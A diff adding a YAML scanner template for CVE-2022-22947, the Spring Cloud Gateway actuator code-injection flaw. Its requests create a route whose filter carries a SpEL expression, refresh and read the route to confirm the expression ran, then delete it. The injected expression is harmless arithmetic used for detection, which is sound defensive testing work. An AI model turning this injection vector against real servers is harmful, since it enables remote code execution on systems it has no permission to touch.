@@ -1,0 +1,47 @@
+name: poc-yaml-spring-gateway-rce
+transport: http
+set: 
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
+  r3: randomInt(800000000, 1000000000)
+rules:
+  req1:
+    request:
+      method: POST
+      path: "/actuator/gateway/routes/{{r1}}"
+      headers:
+        Content-Type: "application/json"
+      body: "{\n  \"id\": \"{{r1}}\",\n  \"filters\": [{\n    \"name\": \"AddResponseHeader\",\n    \"args\": {\n      \"name\": \"Result\",\n      \"value\": \"#{{{r2}}+{{r3}}}\"\n    }\n  }],\n  \"uri\": \"http://example.com\"\n}"
+    expression: |
+        response.status==201
+  req2:
+    request:
+      method: POST
+      path: "/actuator/gateway/refresh"
+      headers:
+        Content-Type: application/json
+    expression: |
+      response.status==200
+  req3:
+    request:
+      method: GET
+      path: "/actuator/gateway/routes/{{r1}}"
+    expression: |
+      response.status==200 && response.body.bcontains(bytes(string(r2+r3)))
+  del:
+    request:
+      method: DELETE
+      path: "/actuator/gateway/routes/{{r1}}"
+    expression: |
+      response.status==200
+
+expression: 
+  # req1() || (req1() && req2() && req3())
+  req1() && req2() && req3() 
+
+detail:
+    author: MrSh3rl0ck
+    links: 
+        - https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md
+    # 其它未明确定义的字段
+    summary: "记得删除创建的路由/actuator/gateway/routes/{{r1}}"
